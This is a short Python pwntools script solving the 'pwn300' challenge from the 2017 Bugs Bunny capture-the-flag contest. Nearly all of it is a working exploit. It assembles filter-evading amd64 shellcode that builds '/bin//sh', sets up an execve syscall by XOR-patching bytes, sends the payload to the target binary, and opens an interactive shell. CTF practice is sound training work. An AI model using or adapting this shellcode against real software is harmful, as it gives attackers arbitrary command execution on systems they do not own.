# 2017 bugs_bunny_ctf
from pwn import *

r = process('./pwn300')
e = ELF('./pwn300')

context.arch = 'amd64'
payload = ''
payload += asm('push rbx; pushw 0x6873; pushw 0x2f2f; pushw 0x6e69; pushw 0x622f; push rsp; pop rdi')
payload += asm('push rbx; pop rsi')
payload += asm('push rbx; pop rdx')
payload += asm('push rbx; pop rax')
payload += asm('xor ax, 0x7070; xor ax, 0x757f')
payload += asm('xor word ptr [rdi+0x60], ax')
payload += asm('push 0x3b; pop rax')
print payload

r.send(payload)
r.interactive()
